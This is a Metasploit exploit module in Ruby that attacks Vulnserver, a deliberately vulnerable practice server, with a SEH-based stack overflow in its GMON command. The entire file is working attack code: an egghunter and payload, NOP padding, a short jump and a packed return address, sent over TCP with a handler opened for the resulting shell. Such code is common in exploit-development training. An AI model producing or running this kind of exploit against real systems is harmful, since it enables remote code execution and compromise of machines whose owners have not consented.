require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

      include Msf::Exploit::Remote::Tcp
      include Msf::Exploit::Remote::Seh
      include Msf::Exploit::Remote::Egghunter
      def initialize(info = {})
                super(update_info(info,
                        'Name'           => 'Vulnserver GMON SEH Overflow',
                        'Description'    => %q{
                                        This module exploits a stack overflow in a 
                                        custom vulnerable server.
                                             },
                        'Author'         => [ 'Matthew Perry' ],
                        'Version'        => '$Revision: 1 $',
                        'DefaultOptions' =>
                                {
                                        'EXITFUNC' => 'seh',
                                },
                        'Payload'        =>
                                {
                                        'Space'    => 1400,
                                        'BadChars' => "\x00\xff",
                                },
                        'Platform'       => 'win',

                        'Targets'        =>
                                [
                                        ['Windows 7',
                                          { 'Ret' => 0x625011B3, 'Offset' => 3515 } ],
                                ],
                        'DefaultTarget' => 0,

                        'Privileged'     => false
                        ))

                        register_options(
                        [
                                Opt::RPORT(9999)
                        ], self.class)
       end

       def exploit
          eggoptions =
          {
            :checksum => true,
            :eggtag => 'w00t'
          }

          hunter,egg = generate_egghunter(payload.encoded, eggoptions)

          connect

          pre = make_nops(target['Offset'] - egg.length) + egg + "\xeb\x06\x90\x90"
          post = hunter + make_nops(5050 - pre.length - hunter.length)
          sploit = "GMON /.:/" + pre + [target.ret].pack('V') + post
          sock.put(sploit)

          handler
          disconnect

       end

end
